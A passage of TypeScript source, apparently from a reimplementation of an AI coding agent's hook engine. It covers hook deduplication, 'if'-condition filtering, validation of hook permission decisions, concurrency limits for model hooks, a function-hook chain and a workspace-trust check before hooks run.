            hookDedupKey(
              m,
              `${(m.hook as { prompt: string }).prompt}\0${getIfCondition(m.hook as { if?: string })}`,
            ),
            m,
          ]),
      ).values(),
    )
    const uniqueHttpHooks = Array.from(
      new Map(
        matchedHooks
          .filter(m => m.hook.type === 'http')
          .map(m => [
            hookDedupKey(
              m,
              `${(m.hook as { url: string }).url}\0${getIfCondition(m.hook as { if?: string })}`,
            ),
            m,
          ]),
      ).values(),
    )
    const uniqueMcpToolHooks = Array.from(
      new Map(
        matchedHooks
          .filter(m => m.hook.type === 'mcp_tool')
          .map(m => {
            const hook = m.hook as HookCommand & {
              type: 'mcp_tool'
              server: string
              tool: string
              input?: unknown
              if?: string
            }
            return [
              hookDedupKey(
                m,
                `mcp_tool\0${hook.server}\0${hook.tool}\0${JSON.stringify(hook.input ?? {})}\0${getIfCondition(hook)}`,
              ),
              m,
            ] as const
          }),
      ).values(),
    )
    const callbackHooks = matchedHooks.filter(m => m.hook.type === 'callback')
    // Function hooks don't need deduplication - each callback is unique
    const functionHooks = matchedHooks.filter(m => m.hook.type === 'function')
    const uniqueHooks = [
      ...uniqueCommandHooks,
      ...uniquePromptHooks,
      ...uniqueAgentHooks,
      ...uniqueHttpHooks,
      ...uniqueMcpToolHooks,
      ...callbackHooks,
      ...functionHooks,
    ]

    // Filter hooks based on their `if` condition. This allows hooks to specify
    // conditions like "Bash(git *)" to only run for git commands, avoiding
    // process spawning overhead for non-matching commands.
    const hasIfCondition = uniqueHooks.some(
      h =>
        (h.hook.type === 'command' ||
          h.hook.type === 'prompt' ||
          h.hook.type === 'agent' ||
          h.hook.type === 'http' ||
          h.hook.type === 'mcp_tool') &&
        (h.hook as { if?: string }).if,
    )
    const ifMatcher = hasIfCondition
      ? await prepareIfConditionMatcher(hookInput, tools)
      : undefined
    const ifFilteredHooks = uniqueHooks.flatMap(h => {
      if (
        h.hook.type !== 'command' &&
        h.hook.type !== 'prompt' &&
        h.hook.type !== 'agent' &&
        h.hook.type !== 'http' &&
        h.hook.type !== 'mcp_tool'
      ) {
        return [h]
      }
      const ifCondition = (h.hook as { if?: string }).if
      if (!ifCondition) {
        return [h]
      }
      if (!ifMatcher) {
        logForDebugging(
          `Hook if condition "${ifCondition}" cannot be evaluated for non-tool event ${hookInput.hook_event_name}`,
        )
        return []
      }
      if (ifMatcher(ifCondition)) {
        const parsedToolName = normalizeLegacyToolName(
          permissionRuleValueFromString(ifCondition).toolName,
        )
        if (
          h.matcherMetThroughOtherName !== undefined &&
          matchQuery !== undefined &&
          parsedToolName === normalizeLegacyToolName(matchQuery) &&
          getMonitorBashStandIn(matchQuery, hookToolInput) !== undefined
        ) {
          logForDebugging(
            `Skipping hook: its if condition "${ifCondition}" names Monitor, and its matcher met the call only through Bash`,
          )
          return []
        }
        if (h.matcherMetThroughOtherName !== undefined) {
          return [h]
        }
        if (
          matchQuery !== undefined &&
          parsedToolName !== normalizeLegacyToolName(matchQuery) &&
          familyNames.includes(parsedToolName)
        ) {
          return [
            {
              ...h,
              throughFamilyOnly: true,
              matcherMetThroughOtherName: parsedToolName,
            },
          ]
        }
        return [h]
      }
      logForDebugging(
        `Skipping hook due to if condition "${ifCondition}" not matching`,
      )
      return []
    })

    // HTTP hooks are not supported for SessionStart/Setup events. In headless
    // mode the sandbox ask callback deadlocks because the structuredInput
    // consumer hasn't started yet when these hooks fire.
    const filteredHooks =
      hookEvent === 'SessionStart' || hookEvent === 'Setup'
        ? ifFilteredHooks.filter(h => {
            if (h.hook.type === 'http') {
              logForDebugging(
                `Skipping HTTP hook ${(h.hook as { url: string }).url} — HTTP hooks are not supported for ${hookEvent}`,
              )
              return false
            }
            return true
          })
        : ifFilteredHooks

    logForDebugging(
      `Matched ${filteredHooks.length} unique hooks for query "${matchQuery || 'no match query'}" (${matchedHooks.length} before deduplication)`,
      { level: 'verbose' },
    )
    return filteredHooks
  } catch (err) {
    // densable EVt + cK: matchers already loaded OR fail-closed event → rethrow
    // so executeHooks / executeHooksOutsideREPL enforce fail-closed denial.
    if (loadedMatcherCount > 0) {
      throw err
    }
    logForDebugging(
      `Failed to resolve matching hooks for ${hookEvent}: ${errorMessage(err)}`,
      { level: 'error' },
    )
    if (!tiers?.suppressTelemetry) {
      logEvent('tengu_feature_bad', {
        feature_name: hookTelemetryFeatureName(
          hookEvent,
        ) as AnalyticsMetadata_I_VERIFIED_THIS_IS_NOT_CODE_OR_FILEPATHS,
        error_code:
          'hook_match_failed' as AnalyticsMetadata_I_VERIFIED_THIS_IS_NOT_CODE_OR_FILEPATHS,
      })
    }
    if (shouldFailClosedHookInput(hookEvent)) {
      throw err
    }
    return []
  }
}

/** densable Lee — `hook_${snakeCase(event)}`. */
function hookTelemetryFeatureName(event: string): string {
  return `hook_${event.replace(/([a-z0-9])([A-Z])/g, '$1_$2').toLowerCase()}`
}

const CLASSIC_HOOK_PINNED_FIELDS = [
  'hook_event_name',
  'session_id',
  'transcript_path',
  'cwd',
  'scratchpad_dir',
  'prompt_id',
  'permission_mode',
  'agent_id',
  'agent_type',
  'served_call',
  'caller_session_id',
  'effort',
] as const

const CLASSIC_ALLOWED_UPDATED_PERMISSION_DESTINATIONS = new Set([
  'userSettings',
  'projectSettings',
  'localSettings',
  'session',
  'cliArg',
])

const CLASSIC_ALLOWED_PERMISSION_MODES = new Set([
  'default',
  'acceptEdits',
  'bypassPermissions',
  'plan',
  'dontAsk',
  'auto',
])

function checkClassicUpdatedPermissionEntry(
  entry: unknown,
): string | undefined {
  if (!entry || typeof entry !== 'object' || Array.isArray(entry)) {
    return 'an updatedPermissions entry that is not an object'
  }
  const rec = entry as Record<string, unknown>
  if (
    typeof rec.destination !== 'string' ||
    !CLASSIC_ALLOWED_UPDATED_PERMISSION_DESTINATIONS.has(rec.destination)
  ) {
    return 'an updatedPermissions entry with an unknown destination'
  }
  switch (rec.type) {
    case 'addRules':
    case 'replaceRules':
    case 'removeRules':
      return (rec.behavior === 'allow' ||
        rec.behavior === 'deny' ||
        rec.behavior === 'ask') &&
        Array.isArray(rec.rules) &&
        rec.rules.every(
          r =>
            r !== null &&
            typeof r === 'object' &&
            !Array.isArray(r) &&
            typeof (r as Record<string, unknown>).toolName === 'string' &&
            ((r as Record<string, unknown>).ruleContent === undefined ||
              typeof (r as Record<string, unknown>).ruleContent === 'string'),
        )
        ? undefined
        : `an updatedPermissions ${rec.type} without rules and a behavior`
    case 'setMode':
      return typeof rec.mode === 'string' &&
        CLASSIC_ALLOWED_PERMISSION_MODES.has(rec.mode)
        ? undefined
        : 'an updatedPermissions setMode with an unknown mode'
    case 'addDirectories':
    case 'removeDirectories':
      return Array.isArray(rec.directories) &&
        rec.directories.every(d => typeof d === 'string')
        ? undefined
        : `an updatedPermissions ${rec.type} without directories`
    default:
      return 'an updatedPermissions entry of an unknown type'
  }
}

function checkClassicDecisionObject(decision: unknown): string | undefined {
  if (decision === undefined) return undefined
  if (!decision || typeof decision !== 'object' || Array.isArray(decision)) {
    return 'a decision that is not an object'
  }
  const rec = decision as Record<string, unknown>
  if (rec.behavior === 'deny') {
    return (rec.message === undefined || typeof rec.message === 'string') &&
      (rec.interrupt === undefined || typeof rec.interrupt === 'boolean')
      ? undefined
      : 'a deny decision whose message or interrupt has the wrong type'
  }
  if (rec.behavior !== 'allow') {
    return 'a decision whose behavior is not allow or deny'
  }
  if (
    rec.updatedInput !== undefined &&
    (!rec.updatedInput ||
      typeof rec.updatedInput !== 'object' ||
      Array.isArray(rec.updatedInput))
  ) {
    return 'an allow decision whose updatedInput is not an object'
  }
  if (rec.updatedPermissions === undefined) return undefined
  if (!Array.isArray(rec.updatedPermissions)) {
    return 'an allow decision whose updatedPermissions is not a list'
  }
  for (const item of rec.updatedPermissions) {
    const problem = checkClassicUpdatedPermissionEntry(item)
    if (problem !== undefined) return problem
  }
  return undefined
}

/** densable Zer — pin read-only classic fields across next() and validate return fields. */
const CLASSIC_HOOK_HOP_SITE = {
  checkArgument(
    passed: Record<string, unknown>,
    original: Record<string, unknown>,
  ): string | undefined {
    for (const key of CLASSIC_HOOK_PINNED_FIELDS) {
      if (JSON.stringify(passed[key]) !== JSON.stringify(original[key])) {
        return `a changed ${key} (pinned)`
      }
    }
    return undefined
  },
  check(returned: unknown): string | undefined {
    if (!returned || typeof returned !== 'object' || Array.isArray(returned)) {
      return 'a non-object result'
    }
    const rec = returned as Record<string, unknown>
    const badFields = [
      ...[
        'block',
        'stopReason',
        'sessionTitle',
        'initialUserMessage',
        'displayContent',
        'permissionDecisionReason',
        'worktreePath',
      ].filter(k => rec[k] !== undefined && typeof rec[k] !== 'string'),
      ...[
        'preventContinuation',
        'suppressOriginalPrompt',
        'reloadSkills',
        'retry',
      ].filter(k => rec[k] !== undefined && rec[k] !== true),
      ...['additionalContext', 'watchPaths'].filter(
        k =>
          rec[k] !== undefined &&
          !(
            typeof rec[k] === 'string' ||
            (Array.isArray(rec[k]) && rec[k].every(s => typeof s === 'string'))
          ),
      ),
    ]
    if (badFields.length > 0) {
      return `${badFields.join(', ')} of the wrong type`
    }
    const pd = rec.permissionDecision
    if (pd !== undefined && pd !== 'allow' && pd !== 'deny' && pd !== 'ask') {
      return 'a permissionDecision that is not allow, deny or ask'
    }
    return checkClassicDecisionObject(rec.decision)
  },
}

const PERMISSION_DECISION_RANK: Readonly<Record<string, number>> = {
  allow: 1,
  ask: 2,
  deny: 3,
}

/** densable Vlt + Xlt — stricter permissionDecision wins; non-decision managed fields persist. */
function mergeManagedAndDownstreamClassicEvent(
  managedResult: Record<string, unknown>,
  downstreamEvent: Record<string, unknown>,
): Record<string, unknown> {
  const merged: Record<string, unknown> = { ...downstreamEvent }
  const rank = (val: unknown): number =>
    typeof val === 'string' ? (PERMISSION_DECISION_RANK[val] ?? 0) : 0
  const downstreamStricter =
    rank(downstreamEvent.permissionDecision) >
    rank(managedResult.permissionDecision)
  const [winner, loser] = downstreamStricter
    ? [downstreamEvent, managedResult]
    : [managedResult, downstreamEvent]
  if (winner.permissionDecision !== undefined) {
    merged.permissionDecision = winner.permissionDecision
    const reason =
      winner.permissionDecisionReason ??
      (winner.permissionDecision === loser.permissionDecision
        ? loser.permissionDecisionReason
        : undefined)
    if (reason !== undefined) {
      merged.permissionDecisionReason = reason
    } else {
      delete merged.permissionDecisionReason
    }
  }
  const managedDecision = managedResult.decision as
    | PermissionRequestResult
    | undefined
  const downstreamDecision = downstreamEvent.decision as
    | PermissionRequestResult
    | undefined
  if (downstreamDecision?.behavior === 'deny') {
    merged.decision = downstreamDecision
  } else if (managedDecision !== undefined) {
    merged.decision = managedDecision
  }
  for (const key of ['additionalContext', 'watchPaths'] as const) {
    const mArr = Array.isArray(managedResult[key])
      ? managedResult[key]
      : typeof managedResult[key] === 'string'
        ? [managedResult[key]]
        : []
    const dArr = Array.isArray(downstreamEvent[key])
      ? downstreamEvent[key]
      : typeof downstreamEvent[key] === 'string'
        ? [downstreamEvent[key]]
        : []
    if (mArr.length > 0 || dArr.length > 0) {
      merged[key] = [...mArr, ...dArr]
    }
  }
  const decisionKeys = new Set([
    'additionalContext',
    'watchPaths',
    'permissionDecision',
    'permissionDecisionReason',
    'decision',
  ])
  for (const [key, val] of Object.entries(managedResult)) {
    if (!decisionKeys.has(key) && val !== undefined) {
      merged[key] = val
    }
  }
  return merged
}

/**
 * Common logic for executing hooks
 * @param hookInput The structured hook input that will be validated and converted to JSON
 * @param toolUseID The ID for tracking this hook execution
 * @param matchQuery The query to match against hook matchers
 * @param signal Optional AbortSignal to cancel hook execution
 * @param timeoutMs Optional timeout in milliseconds for hook execution
 * @param toolUseContext Optional ToolUseContext for prompt-based hooks (required if using prompt hooks)
 * @param messages Optional conversation history for prompt/function hooks
 * @returns Async generator that yields progress messages and hook results
 */
/** #928 (official `fJe = 12`): max concurrent prompt/agent hooks per event. */
export const MAX_CONCURRENT_MODEL_HOOKS_PER_EVENT = 12
/** #1336 (official `Nan = 24`): max concurrent prompt/agent hooks per session. */
export const MAX_CONCURRENT_MODEL_HOOKS_PER_SESSION = 24
/** #1336 (official `rmr = 12`): max overdue prompt/agent hooks per session. */
export const MAX_OVERDUE_MODEL_HOOKS_PER_SESSION = 12
/** #1336 (official `smr = 1`): minimum timeout in seconds for model hooks. */
export const MIN_MODEL_HOOK_TIMEOUT_SECONDS = 1
const MODEL_HOOK_HOLD_GRACE_MS = 10_000
const MODEL_HOOKS_SLOT = 'model hooks'
const OVERDUE_MODEL_HOOKS_SLOT = 'overdue model hooks'
const MAX_SAFE_TIMER_MS = 2_147_483_647

export function resolveModelHookTimeoutMs(
  hook: { timeout?: number },
  defaultTimeoutMs: number,
): number {
  return hook.timeout
    ? Math.max(hook.timeout, MIN_MODEL_HOOK_TIMEOUT_SECONDS) * 1000
    : defaultTimeoutMs
}

type SlotWaiter = {
  limit: number
  signal: AbortSignal
  grant: () => void
  cancel: () => void
}

type SlotBucket = {
  active: number
  waiters: SlotWaiter[]
}

/**
 * Gold `XNt` (#1336) — FIFO semaphore pool keyed by slot name.
 */
export class ModelHookSlotPool {
  private buckets = new Map<string, SlotBucket>()

  acquire(
    slot: string,
    limit: number,
    signal: AbortSignal,
  ): Promise<(() => void) | undefined> {
    const bucket = this.getBucket(slot)
    const release = () => {
      bucket.active -= 1
      this.drain(bucket)
    }
    if (signal.aborted) {
      return Promise.resolve(undefined)
    }
    if (bucket.active < limit && bucket.waiters.length === 0) {
      bucket.active += 1
      return Promise.resolve(release)
    }
    return new Promise(resolve => {
      const onAbort = () => {
        const idx = bucket.waiters.indexOf(waiter)
        if (idx !== -1) {
          bucket.waiters.splice(idx, 1)
        }
        resolve(undefined)
        this.drain(bucket)
      }
      const waiter: SlotWaiter = {
        limit,
        signal,
        grant: () => {
          signal.removeEventListener('abort', onAbort)
          resolve(release)
        },
        cancel: () => resolve(undefined),
      }
      bucket.waiters.push(waiter)
      signal.addEventListener('abort', onAbort, { once: true })
      this.drain(bucket)
    })
  }

  wouldWait(slot: string, limit: number): boolean {
    const bucket = this.getBucket(slot)
    return bucket.active >= limit || bucket.waiters.length > 0
  }

  occupy(slot: string): () => void {
    const bucket = this.getBucket(slot)
    bucket.active += 1
    return () => {
      bucket.active -= 1
      this.drain(bucket)
    }
  }

  private drain(bucket: SlotBucket): void {
    while (
      bucket.waiters.length > 0 &&
      bucket.active < bucket.waiters[0]!.limit
    ) {
      const next = bucket.waiters.shift()!
      if (next.signal.aborted) {
        next.cancel()
        continue
      }
      bucket.active += 1
      next.grant()
    }
  }

  private getBucket(slot: string): SlotBucket {
    let bucket = this.buckets.get(slot)
    if (!bucket) {
      bucket = { active: 0, waiters: [] }
      this.buckets.set(slot, bucket)
    }
    return bucket
  }
}

export type SessionModelHookSlots = {
  slots: ModelHookSlotPool
  holder: AsyncLocalStorage<{ isHeld: boolean }>
}

export function createSessionModelHookSlots(): SessionModelHookSlots {
  return {
    slots: new ModelHookSlotPool(),
    holder: new AsyncLocalStorage<{ isHeld: boolean }>(),
  }
}

let sessionModelHookSlots: SessionModelHookSlots | undefined
export function getSessionModelHookSlots(): SessionModelHookSlots {
  sessionModelHookSlots ??= createSessionModelHookSlots()
  return sessionModelHookSlots
}

async function waitForModelHookSlot(
  pool: ModelHookSlotPool,
  slot: string,
  limit: number,
  signal: AbortSignal,
  waitLimitMs: number,
): Promise<{ seated: boolean; release: () => void } | undefined> {
  const combined = createCombinedAbortSignal(signal, {
    timeoutMs: waitLimitMs,
  })
  let release = await pool.acquire(slot, limit, combined.signal)
  combined.cleanup()
  if (release === undefined && signal.aborted) {
    return undefined
  }
  return {
    seated: release !== undefined,
    release: () => {
      release?.()
      release = undefined
    },
  }
}

function advanceWithHeldSlot<T>(
  gen: AsyncGenerator<T, void>,
  sessionSlots: SessionModelHookSlots,
  release: (() => void) | undefined,
  hookTimeoutMs: number,
): Promise<IteratorResult<T, void>> {
  if (release === undefined) {
    return gen.next()
  }
  const state = { isHeld: true }
  const doRelease = () => {
    if (state.isHeld) {
      state.isHeld = false
      release()
    }
  }
  const timer = setTimeout(
    doRelease,
    Math.min(hookTimeoutMs, MAX_SAFE_TIMER_MS - MODEL_HOOK_HOLD_GRACE_MS) +
      MODEL_HOOK_HOLD_GRACE_MS,
  )
  timer.unref?.()
  const settle = () => {
    clearTimeout(timer)
    doRelease()
  }
  const nextPromise = sessionSlots.holder.run(state, () => gen.next())
  nextPromise.then(settle, settle)
  return nextPromise
}

function wrapModelHookGeneratorWithSessionSlot<T>(
  gen: AsyncGenerator<T, void>,
  hookTimeoutMs: number,
  slotCtx: {
    slots: SessionModelHookSlots
    signal: AbortSignal
    limitMs: number
  },
  batchAbortSignal: AbortSignal,
): AsyncGenerator<T, void> {
  let started = false
  const wrapped: AsyncGenerator<T, void> = {
    next: () => {
      if (started) {
        return gen.next()
      }
      started = true
      if (batchAbortSignal.aborted) {
        return gen.return(undefined)
      }
      if (slotCtx.slots.holder.getStore()?.isHeld === true) {
        return gen.next()
      }
      if (
        !slotCtx.slots.slots.wouldWait(
          MODEL_HOOKS_SLOT,
          MAX_CONCURRENT_MODEL_HOOKS_PER_SESSION,
        )
      ) {
        return advanceWithHeldSlot(
          gen,
          slotCtx.slots,
          slotCtx.slots.slots.occupy(MODEL_HOOKS_SLOT),
          hookTimeoutMs,
        )
      }
      const combined = createCombinedAbortSignal(slotCtx.signal, {
        // Combine with batchAbortSignal via listener below
      })
      const onBatchAbort = () => {
        combined.cleanup()
      }
      batchAbortSignal.addEventListener('abort', onBatchAbort, { once: true })
      const effectiveSignal = AbortSignal.any([
        slotCtx.signal,
        batchAbortSignal,
      ])
      return waitForModelHookSlot(
        slotCtx.slots.slots,
        MODEL_HOOKS_SLOT,
        MAX_CONCURRENT_MODEL_HOOKS_PER_SESSION,
        effectiveSignal,
        slotCtx.limitMs,
      )
        .then(ticket =>
          ticket?.seated === false
            ? slotCtx.slots.slots.acquire(
                OVERDUE_MODEL_HOOKS_SLOT,
                MAX_OVERDUE_MODEL_HOOKS_PER_SESSION,
                effectiveSignal,
              )
            : ticket?.release,
        )
        .then(release => {
          batchAbortSignal.removeEventListener('abort', onBatchAbort)
          combined.cleanup()
          if (batchAbortSignal.aborted) {
            release?.()
            return gen.return(undefined)
          }
          return advanceWithHeldSlot(gen, slotCtx.slots, release, hookTimeoutMs)
        })
    },
    return: value => gen.return(value),
    throw: err => gen.throw(err),
    [Symbol.asyncIterator]: () => wrapped,
    [Symbol.asyncDispose]: () =>
      gen[Symbol.asyncDispose]?.() ?? Promise.resolve(),
  }
  return wrapped
}

/**
 * #928 / #1336 (official `zan`): run non-model hooks uncapped while capping
 * prompt/agent hooks at 12 per event AND 24 per session (+ 12 overdue).
 */
export async function* mergeHookGeneratorsWithModelCap<T>(
  entries: ReadonlyArray<{
    isModelHook: boolean
    generator: AsyncGenerator<T, void>
    timeoutMs?: number
  }>,
  maxConcurrentModelHooks = MAX_CONCURRENT_MODEL_HOOKS_PER_EVENT,
  sessionSlotCtx?: {
    slots: SessionModelHookSlots
    signal: AbortSignal
    limitMs: number
  },
): AsyncGenerator<T, void> {
  const modelEntries = entries.filter(e => e.isModelHook)
  if (!sessionSlotCtx) {
    const modelGens = modelEntries.map(e => e.generator)
    if (modelGens.length <= 1) {
      yield* all(entries.map(e => e.generator))
      return
    }
    const nonModelGens = entries
      .filter(e => !e.isModelHook)
      .map(e => e.generator)
    yield* all([...nonModelGens, all(modelGens, maxConcurrentModelHooks)])
    return
  }

  const batchAbort = new AbortController()
  try {
    if (modelEntries.length <= 1) {
      yield* all(
        entries.map(e =>
          e.isModelHook
            ? wrapModelHookGeneratorWithSessionSlot(
                e.generator,
                e.timeoutMs ?? sessionSlotCtx.limitMs,
                sessionSlotCtx,
                batchAbort.signal,
              )
            : e.generator,
        ),
      )
      return
    }
    const nonModelGens = entries
      .filter(e => !e.isModelHook)
      .map(e => e.generator)
    const wrappedModelGens = modelEntries.map(e =>
      wrapModelHookGeneratorWithSessionSlot(
        e.generator,
        e.timeoutMs ?? sessionSlotCtx.limitMs,
        sessionSlotCtx,
        batchAbort.signal,
      ),
    )
    yield* all([
      ...nonModelGens,
      all(wrappedModelGens, maxConcurrentModelHooks),
    ])
  } finally {
    batchAbort.abort()
  }
}

async function* executeHooks({
  hookInput,
  toolUseID,
  matchQuery,
  signal,
  timeoutMs = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  toolUseContext,
  messages,
  forceSyncExecution,
  suppressPerInvocationTelemetry,
  /** densable classicChainMember — set while next() runs the settings hooks. */
  classicChainMember,
  requestPrompt,
  toolInputSummary,
  storageV5,
  credentials,
  skipSessionFunctionHooks,
  sessionFunctionHooksOnly,
  managedHooksOnly,
  managedHooksExcluded,
  sessionStartOptions,
}: {
  managedHooksOnly?: boolean
  managedHooksExcluded?: boolean
  sessionStartOptions?: SessionStartHookExecutionOptions
  hookInput: HookInput
  toolUseID: string
  matchQuery?: string
  signal?: AbortSignal
  timeoutMs?: number
  toolUseContext?: ToolUseContext
  messages?: Message[]
  forceSyncExecution?: boolean
  /** densable classicChainMember — set while next() runs the settings hooks. */
  classicChainMember?: boolean
  /**
   * densable suppressPerInvocationTelemetry — when true, skip tengu_run_hook
   * per-invocation telemetry (MessageDisplay streaming hot path).
   */
  suppressPerInvocationTelemetry?: boolean
  requestPrompt?: (
    sourceName: string,
    toolInputSummary?: string | null,
  ) => (request: PromptRequest) => Promise<PromptResponse>
  toolInputSummary?: string | null
  /** densable PBr persist — `a?.storageV5 ?? m` / `a?.credentials ?? g`. */
  storageV5?: unknown
  credentials?: unknown
  /**
   * densable skipSessionFunctionHooks — turn_end and blockable_turn_end drop
   * session function hooks (Ot / turn_end_reactions is function-only).
   */
  skipSessionFunctionHooks?: boolean
  /**
   * densable sessionFunctionHooksOnly — turn_end_reactions keeps function
   * hooks only (gold Ot).
   */
  sessionFunctionHooksOnly?: boolean
}): AsyncGenerator<AggregatedHookResult> {
  const persistStorageV5 = toolUseContext?.storageV5 ?? storageV5
  const persistCredentials = toolUseContext?.credentials ?? credentials

  if (isEnvTruthy(process.env.CLAUDE_CODE_SIMPLE)) {
    return
  }

  const hookEvent = hookInput.hook_event_name
  const hookName = matchQuery ? `${hookEvent}:${matchQuery}` : hookEvent

  // Bind the prompt callback to this hook's name and tool input summary so the UI can display context
  const boundRequestPrompt = requestPrompt?.(hookName, toolInputSummary)

  // densable VA @189509974: skip xKo (function-hook chain) when
  // classicChainMember | managedHooksOnly | sessionFunctionHooksOnly.
  // Gold AC/Zv still skips PreToolUse; gold Rze @185182837 is the PreToolUse
  // host and runs uwn then QLn. Local Rze is executePreToolHooks → executeHooks,
  // so PreToolUse must enter this chain unless this dispatch is managed-only
  // (AVt/kce). A chain member must not enter again.
  if (
    !classicChainMember &&
    !managedHooksOnly &&
    !shouldDisableAllHooksIncludingManaged() &&
    !sessionFunctionHooksOnly &&
    hasMatchingFunctionHook(hookEvent)
  ) {
    const eventRecord: Record<string, unknown> = {
      ...(hookInput as unknown as Record<string, unknown>),
    }
    if (hookInput.hook_event_name === 'PreToolUse') {
      eventRecord.tool = hookInput.tool_name
    }
    const classicYields: AggregatedHookResult[] = []
    if (!managedHooksExcluded) {
      for await (const result of executeHooks({
        hookInput,
        toolUseID,
        matchQuery,
        signal,
        timeoutMs,
        toolUseContext,
        messages,
        forceSyncExecution,
        suppressPerInvocationTelemetry,
        classicChainMember: true,
        managedHooksOnly: true,
        requestPrompt,
        toolInputSummary,
        storageV5,
        credentials,
        skipSessionFunctionHooks,
        sessionFunctionHooksOnly,
      }))
        classicYields.push(result)
    }
    const managedResult = projectClassicHookResults(classicYields)
    if (
      managedResult.block !== undefined ||
      managedResult.preventContinuation === true ||
      managedResult.permissionDecision === 'deny' ||
      (managedResult.decision as PermissionRequestResult | undefined)
        ?.behavior === 'deny'
    ) {
      yield* classicYields
      return
    }
    let classicResult: Record<string, unknown> = managedResult
    const chained = await runFunctionHookChain(
      hookEvent,
      eventRecord,
      async event => {
        const results: AggregatedHookResult[] = []
        for await (const result of executeHooks({
          hookInput: event as typeof hookInput,
          toolUseID,
          matchQuery,
          signal,
          timeoutMs,
          toolUseContext,
          messages,
          forceSyncExecution,
          suppressPerInvocationTelemetry,
          classicChainMember: true,
          managedHooksExcluded: true,
          requestPrompt,
          toolInputSummary,
          storageV5,
          credentials,
          skipSessionFunctionHooks,
          sessionFunctionHooksOnly,
        })) {
          results.push(result)
        }
        classicYields.push(...results)
        classicResult = projectClassicHookResults(classicYields)
        return { ...event, ...projectClassicHookResults(results) }
      },
      undefined,
      undefined,
      { signal, site: CLASSIC_HOOK_HOP_SITE },
    )
    const rawFinalEvent =
      chained && typeof chained === 'object'
        ? (chained as Record<string, unknown>)
        : eventRecord
    const finalEvent = mergeManagedAndDownstreamClassicEvent(
      managedResult,
      rawFinalEvent,
    )
    const baseline = { ...eventRecord, ...classicResult }
    const changed = new Set(
      [
        ...new Set([...Object.keys(finalEvent), ...Object.keys(baseline)]),
      ].filter(
        key =>
          JSON.stringify(finalEvent[key]) !== JSON.stringify(baseline[key]),
      ),
    )
    const replaced = new Set(
      [...changed].flatMap(key => classicResultFields(key, hookEvent)),
    )
    for (const prior of classicYields) {
      const retained = Object.fromEntries(
        Object.entries(prior).filter(([key]) => !replaced.has(key)),
      ) as AggregatedHookResult
      if (Object.keys(retained).length > 0) yield retained
    }
    const returned: Record<string, unknown> = Object.fromEntries(
      [...changed].map(key => [key, finalEvent[key]]),
    )
    if (changed.has('permissionDecision')) {
      returned.permissionBehavior = finalEvent.permissionDecision
      returned.hookPermissionDecisionReason =
        finalEvent.permissionDecisionReason
    } else if (changed.has('permissionDecisionReason')) {
      returned.permissionBehavior = finalEvent.permissionDecision
      returned.hookPermissionDecisionReason =
        finalEvent.permissionDecisionReason
    }
    if (changed.has('decision')) {
      returned.permissionRequestResult = finalEvent.decision
      const decision = finalEvent.decision as
        | PermissionRequestResult
        | undefined
      if (decision) {
        returned.permissionBehavior = decision.behavior
        if (decision.behavior === 'allow')
          returned.updatedInput = decision.updatedInput
      }
    }
    const originalDelta =
      typeof eventRecord.delta === 'string' ? eventRecord.delta : undefined
    // densable mXe / wSn: yield only keys the function-hook result changed.
    if (
      typeof returned.delta === 'string' &&
      returned.delta !== originalDelta
    ) {
      yield { displayContent: returned.delta }
    }
    if (typeof returned.displayContent === 'string') {
      yield { displayContent: returned.displayContent }
    }
    if (typeof returned.additionalContext === 'string') {
      yield { additionalContexts: [returned.additionalContext] }
    } else if (Array.isArray(returned.additionalContext)) {
      yield {
        additionalContexts: returned.additionalContext.filter(
          (item): item is string => typeof item === 'string',
        ),
      }
    }
    if (Array.isArray(returned.additionalContexts)) {
      yield {
        additionalContexts: returned.additionalContexts.filter(
          (item): item is string => typeof item === 'string',
        ),
      }
    }
    if (returned.preventContinuation === true) {
      yield {
        preventContinuation: true,
        stopReason:
          typeof returned.stopReason === 'string'
            ? returned.stopReason
            : undefined,
      }
    }
    if (typeof returned.stopReason === 'string') {
      yield { stopReason: returned.stopReason }
    }
    if (typeof returned.sessionTitle === 'string') {
      yield { sessionTitle: returned.sessionTitle }
    }
    if (returned.suppressOriginalPrompt === true) {
      yield { suppressOriginalPrompt: true }
    }
    if (typeof returned.initialUserMessage === 'string') {
      yield { initialUserMessage: returned.initialUserMessage }
    }
    if (Array.isArray(returned.watchPaths)) {
      yield {
        watchPaths: returned.watchPaths.filter(
          (item): item is string => typeof item === 'string',
        ),
      }
    }
    if (returned.reloadSkills === true) {
      yield { reloadSkills: true }
    }
    if (returned.updatedToolOutput !== undefined) {
      yield { updatedToolOutput: returned.updatedToolOutput }
    }
    if (returned.updatedMCPToolOutput !== undefined) {
      yield { updatedMCPToolOutput: returned.updatedMCPToolOutput }
    }
    if (returned.retry === true) {
      yield { retry: true }
    }
    if (returned.updatedInput && typeof returned.updatedInput === 'object') {
      yield {
        updatedInput: returned.updatedInput as Record<string, unknown>,
      }
    }
    const returnedBlock =
      returned.block ??
      (returned.permissionBehavior === 'deny'
        ? (returned.hookPermissionDecisionReason ?? 'Blocked by hook')
        : undefined)
    if (returnedBlock !== undefined) {
      yield {
        blockingError: classicYields.find(
          result =>
            result.blockingError?.blockingError === String(returnedBlock),
        )?.blockingError ?? {
          blockingError: String(returnedBlock),
          command: `classic.${hookEvent} hook`,
        },
        ...(hookEvent === 'PreModelSwitch'
          ? {}
          : {
              permissionBehavior: 'deny' as const,
            }),
      }
    }
    const confinedFn = stripEvalConfinedHookAllow(
      {
        permissionBehavior: returned.permissionBehavior,
        permissionRequestResult: returned.permissionRequestResult as
          | { behavior?: unknown }
          | undefined,
      },
      hookEvent === 'PreToolUse'
        ? 'PreToolUse function-hook chain'
        : `Hook ${hookEvent} (function-hook chain)`,
    )
    if (
      confinedFn.permissionBehavior === 'ask' ||
      confinedFn.permissionBehavior === 'deny' ||
      confinedFn.permissionBehavior === 'allow' ||
      confinedFn.permissionBehavior === 'passthrough' ||
      confinedFn.permissionBehavior === 'defer'
    ) {
      yield {
        permissionBehavior: confinedFn.permissionBehavior,
        ...(typeof returned.hookPermissionDecisionReason === 'string'
          ? {
              hookPermissionDecisionReason:
                returned.hookPermissionDecisionReason,
            }
          : {}),
      }
    }
    if (confinedFn.permissionRequestResult !== undefined) {
      yield {
        permissionRequestResult:
          confinedFn.permissionRequestResult as AggregatedHookResult['permissionRequestResult'],
      }
    }
    return
  }

  // SECURITY: ALL hooks require workspace trust in interactive mode
  // This centralized check prevents RCE vulnerabilities for all current and future hooks
  if (shouldSkipHookDueToTrust()) {
    logForDebugging(
      `Skipping ${hookName} hook execution - workspace trust not accepted`,
    )
    return
  }

  const appState = toolUseContext ? toolUseContext.getAppState() : undefined
  // Use the agent's session ID if available, otherwise fall back to main session
